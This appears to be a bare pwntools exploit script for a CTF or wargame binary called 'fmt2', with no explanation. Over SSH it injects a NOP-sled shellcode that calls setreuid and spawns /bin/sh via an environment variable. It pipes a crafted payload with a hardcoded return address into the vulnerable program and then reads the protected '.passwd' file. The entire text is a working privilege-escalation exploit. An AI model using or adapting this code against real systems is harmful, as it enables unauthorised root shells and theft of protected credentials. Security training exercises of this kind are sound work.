#!/usr/bin/env python3
import pwn

pwn.context.clear(arch='i386')
file = './fmt2' 
s = pwn.ssh('login',
            'host',
            password='password',
            port=12345)

### nopsled + setreuid + /bin/sh shellcode
SHELL_CODE = pwn.asm(pwn.shellcraft.i386.nop()) * 100
SHELL_CODE += pwn.asm(pwn.shellcraft.i386.linux.setreuid(1217))
SHELL_CODE += pwn.asm(pwn.shellcraft.i386.linux.sh())
ADDR_SHELL = pwn.p32(0xbffffe01)

payload = b'python -c \'print "%116d'
payload += ADDR_SHELL
payload += b'"\''
payload += b' | ./fmt2'

sh = s.shell('/bin/sh')
sh.sendline(b'export PWN='+SHELL_CODE)
sh.sendline(payload)
sh.sendline(b'cat .passwd')
print(sh.recvline())
print(sh.recvline())
print(sh.recvline())

